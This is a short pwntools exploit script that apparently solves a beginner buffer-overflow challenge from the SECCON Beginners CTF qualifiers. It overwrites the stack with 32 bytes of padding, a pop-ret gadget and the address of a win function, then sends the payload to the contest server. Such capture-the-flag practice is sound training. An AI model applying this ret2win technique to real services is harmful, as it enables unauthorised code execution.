import sys
from pwn import *

binfile = "./chall"
context.binary = binfile
# context.log_level = 'debug'
elf = ELF(binfile)

popret = 0x4011cd # by gdb

win = elf.symbols['win']
log.info('win: %s' % hex(win))

HOST='beginnersbof.quals.beginners.seccon.jp'
PORT=9000
# conn = process(binfile)
conn = remote(HOST, PORT)
log.info("connect to remote server....")

conn.recvuntil('How long is your name?')
# payload = '41'
payload = '100'
log.info("sent payload: %s" % payload)
conn.sendline(payload)

r = conn.recvuntil("What's your name?\n")
log.info(r)
# offset: 32
payload = b"A" * 32
payload += p64(popret)
payload += p64(win)
conn.sendline(payload)

r = conn.recvall()
log.info(r)
conn.interactive()
